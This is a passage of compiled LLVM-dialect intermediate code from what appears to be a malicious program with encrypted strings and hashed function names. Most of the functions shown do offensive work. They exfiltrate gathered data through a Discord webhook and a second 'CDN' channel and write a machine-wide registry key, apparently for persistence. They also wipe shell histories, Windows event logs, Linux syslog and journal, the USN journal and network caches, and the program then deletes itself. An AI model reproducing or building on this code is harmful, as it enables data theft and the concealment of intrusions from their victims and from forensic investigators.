    %20 = llvm.load %4 {alignment = 4 : i64} : !llvm.ptr -> i32
    %21 = llvm.sext %20 : i32 to i64
    %22 = llvm.call @string(%21) : (i64) -> !llvm.ptr
    %23 = llvm.call @jocky_str_concat(%19, %22) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %24 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %25 = llvm.call @jocky_str_concat(%23, %24) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %26 = llvm.load %6 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.call @array_len(%26) : (!llvm.ptr) -> i64
    %28 = llvm.call @string(%27) : (i64) -> !llvm.ptr
    %29 = llvm.call @jocky_str_concat(%25, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %30 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %31 = llvm.call @jocky_str_concat(%29, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %32 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> f64
    %33 = llvm.fptosi %32 : f64 to i64
    %34 = llvm.call @string(%33) : (i64) -> !llvm.ptr
    %35 = llvm.call @jocky_str_concat(%31, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %35, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<122 x i8>
    llvm.store %36, %16 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %38 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.call @exfil_discord_webhook(%37, %38) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %39, %17 {alignment = 4 : i64} : i32, !llvm.ptr
    %40 = llvm.load %17 {alignment = 4 : i64} : !llvm.ptr -> i32
    %41 = llvm.icmp "eq" %40, %2 : i32
    llvm.cond_br %41, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %42 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%42) : (!llvm.ptr) -> ()
    %43 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %44 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %45 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %46 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    llvm.call @f_0218a827(%43, %44, %45, %46) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    llvm.return
  }
  llvm.func @f_a272e225() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.132.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.133.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.116.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @g_e47349ba : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.134.enc" : !llvm.ptr
    %8 = llvm.mlir.constant(34 : i32) : i32
    %9 = llvm.mlir.addressof @".str.135.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.136.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.137.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.142.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.119.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.141.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.138.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.139.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.140.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.121.enc" : !llvm.ptr
    %20 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %22 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %24 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %26 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> f64
    %27 = llvm.fptosi %26 : f64 to i64
    %28 = llvm.call @string(%27) : (i64) -> !llvm.ptr
    %29 = llvm.call @jocky_str_concat(%25, %28) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %30 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %31 = llvm.call @jocky_str_concat(%29, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %32 = llvm.load %6 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %33 = llvm.call @array_len(%32) : (!llvm.ptr) -> i64
    %34 = llvm.call @string(%33) : (i64) -> !llvm.ptr
    %35 = llvm.call @jocky_str_concat(%31, %34) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %35, %20 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.store %36, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %8, %22 {alignment = 4 : i64} : i32, !llvm.ptr
    %37 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    %38 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %39 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    %40 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %41 = llvm.load %22 {alignment = 4 : i64} : !llvm.ptr -> i32
    %42 = llvm.load %20 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %43 = llvm.mlir.addressof @exfil_local_cdn : !llvm.ptr
    %44 = llvm.call %43(%37, %38, %39, %40, %41, %42) : !llvm.ptr, (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32, !llvm.ptr) -> i32
    llvm.store %44, %23 {alignment = 4 : i64} : i32, !llvm.ptr
    %45 = llvm.load %23 {alignment = 4 : i64} : !llvm.ptr -> i32
    %46 = llvm.icmp "eq" %45, %2 : i32
    llvm.cond_br %46, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %47 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%47) : (!llvm.ptr) -> ()
    %48 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %49 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    %50 = llvm.call @jocky_str_concat(%48, %49) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%50) : (!llvm.ptr) -> ()
    %51 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
    llvm.call @println(%51) : (!llvm.ptr) -> ()
    %52 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %53 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %54 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    %55 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @f_0218a827(%52, %53, %54, %55) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb2:  // pred: ^bb0
    %56 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%56) : (!llvm.ptr) -> ()
    %57 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %58 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %59 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    %60 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%57, %58, %59, %60) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    llvm.return
  }
  llvm.func @f_a0b3b851() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.143.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(256 : i32) : i32
    %4 = llvm.mlir.addressof @".str.144.enc" : !llvm.ptr
    %5 = llvm.mlir.constant(-2147483646 : i32) : i32
    %6 = llvm.mlir.addressof @".str.152.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.145.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.146.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.147.enc" : !llvm.ptr
    %10 = llvm.mlir.constant(32 : i32) : i32
    %11 = llvm.mlir.addressof @".str.148.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.149.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.150.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.151.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.121.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %17 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.sext %3 : i32 to i64
    %21 = llvm.call @jocky_alloc(%20) : (i64) -> !llvm.ptr
    llvm.store %21, %17 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %22 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
    %23 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %24 = llvm.mlir.addressof @jocky_registry_create_key : !llvm.ptr
    %25 = llvm.call %24(%5, %22, %23) : !llvm.ptr, (i32, !llvm.ptr, !llvm.ptr) -> i1
    llvm.store %25, %18 {alignment = 1 : i64} : i1, !llvm.ptr
    %26 = llvm.load %18 {alignment = 1 : i64} : !llvm.ptr -> i1
    llvm.cond_br %26, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    %28 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %29 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %30 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %31 = llvm.mlir.addressof @jocky_registry_set_value : !llvm.ptr
    %32 = llvm.call %31(%28, %29, %30, %10, %0) : !llvm.ptr, (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
    %33 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %35 = llvm.mlir.addressof @jocky_registry_close_key : !llvm.ptr
    %36 = llvm.call %35(%34) : !llvm.ptr, (!llvm.ptr) -> i1
    %37 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %38 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %39 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    %40 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @f_0218a827(%37, %38, %39, %40) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb2:  // pred: ^bb0
    %41 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%41) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    %42 = llvm.load %17 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @jocky_free(%42) : (!llvm.ptr) -> ()
    %43 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%43) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_a61efe88() {
    %0 = llvm.mlir.addressof @".str.153.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.154.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.155.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.156.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.157.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.158.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.159.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.160.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %10 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%10) : (!llvm.ptr) -> ()
    %11 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    llvm.call @println(%11) : (!llvm.ptr) -> ()
    %12 = llvm.mlir.addressof @forensics_wipe_powershell_history : !llvm.ptr
    %13 = llvm.call %12() : !llvm.ptr, () -> i32
    %14 = llvm.mlir.addressof @forensics_wipe_cmd_history : !llvm.ptr
    %15 = llvm.call %14() : !llvm.ptr, () -> i32
    %16 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %17 = llvm.mlir.addressof @jocky_cleanup_event_logs : !llvm.ptr
    %18 = llvm.call %17(%16) : !llvm.ptr, (!llvm.ptr) -> i32
    %19 = llvm.mlir.addressof @forensics_flush_arp_cache : !llvm.ptr
    %20 = llvm.call %19() : !llvm.ptr, () -> i32
    %21 = llvm.mlir.addressof @forensics_clear_dns_cache : !llvm.ptr
    %22 = llvm.call %21() : !llvm.ptr, () -> i32
    %23 = llvm.mlir.addressof @jocky_cleanup_usn_journal : !llvm.ptr
    %24 = llvm.call %23() : !llvm.ptr, () -> i32
    %25 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %27 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %28 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %29 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @f_0218a827(%26, %27, %28, %29) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %30 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_eb7aa1a1() {
    %0 = llvm.mlir.addressof @".str.161.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.162.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.157.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.158.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.163.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.160.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %8 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%8) : (!llvm.ptr) -> ()
    %9 = llvm.mlir.addressof @linux_forensics_wipe_bash_history : !llvm.ptr
    %10 = llvm.call %9() : !llvm.ptr, () -> i32
    %11 = llvm.mlir.addressof @jocky_linux_cleanup_syslog : !llvm.ptr
    %12 = llvm.call %11() : !llvm.ptr, () -> i32
    %13 = llvm.mlir.addressof @jocky_linux_cleanup_journal : !llvm.ptr
    %14 = llvm.call %13() : !llvm.ptr, () -> i32
    %15 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %17 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %18 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %19 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @f_0218a827(%16, %17, %18, %19) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %20 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_40a54151() {
    %0 = llvm.mlir.addressof @".str.164.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.165.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.157.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.166.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.167.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.168.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %8 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%8) : (!llvm.ptr) -> ()
    llvm.call @jocky_self_delete() : () -> ()
    %9 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%9) : (!llvm.ptr) -> ()
    %10 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %11 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %12 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %13 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    llvm.call @f_0218a827(%10, %11, %12, %13) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %14 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_d122d020() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.169.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.170.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.176.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.171.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.172.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.173.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.174.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.175.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %11 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %12 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %13 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%13) : (!llvm.ptr) -> ()
    %14 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.store %14, %11 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %15 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %16 = llvm.mlir.addressof @audit_export : !llvm.ptr
    %17 = llvm.call %16(%15) : !llvm.ptr, (!llvm.ptr) -> i1
    %18 = llvm.call @audit_verify() : () -> i32
    llvm.store %18, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %19 = llvm.load %12 {alignment = 4 : i64} : !llvm.ptr -> i32
    %20 = llvm.icmp "eq" %19, %2 : i32
    llvm.cond_br %20, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %21 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    %23 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %24 = llvm.call @jocky_str_concat(%22, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %26 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    %27 = llvm.load %11 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %28 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @f_0218a827(%25, %26, %27, %28) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb2:  // pred: ^bb0
    %29 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<41 x i8>
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    llvm.br ^bb3
  ^bb3:  // 2 preds: ^bb1, ^bb2
    %30 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_9db24be5() {
    %0 = llvm.mlir.addressof @".str.177.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.178.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.179.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.180.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.181.enc" : !llvm.ptr
    %8 = llvm.mlir.addressof @g_e47349ba : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.182.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.37.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.183.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.184.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.185.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.186.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.187.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.188.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.189.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.190.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.191.enc" : !llvm.ptr
    %21 = llvm.mlir.addressof @".str.192.enc" : !llvm.ptr
    %22 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<81 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    %23 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<81 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %28 = llvm.load %6 {alignment = 4 : i64} : !llvm.ptr -> i32
    %29 = llvm.sext %28 : i32 to i64
    %30 = llvm.call @string(%29) : (i64) -> !llvm.ptr
    %31 = llvm.call @jocky_str_concat(%27, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %33 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %34 = llvm.call @array_len(%33) : (!llvm.ptr) -> i64
    %35 = llvm.call @string(%34) : (i64) -> !llvm.ptr
    %36 = llvm.call @jocky_str_concat(%32, %35) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%36) : (!llvm.ptr) -> ()
    %37 = llvm.load %8 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %38 = llvm.call @array_len(%37) : (!llvm.ptr) -> i64
    %39 = llvm.sext %1 : i32 to i64
    %40 = llvm.icmp "sgt" %38, %39 : i64
    llvm.cond_br %40, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %41 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
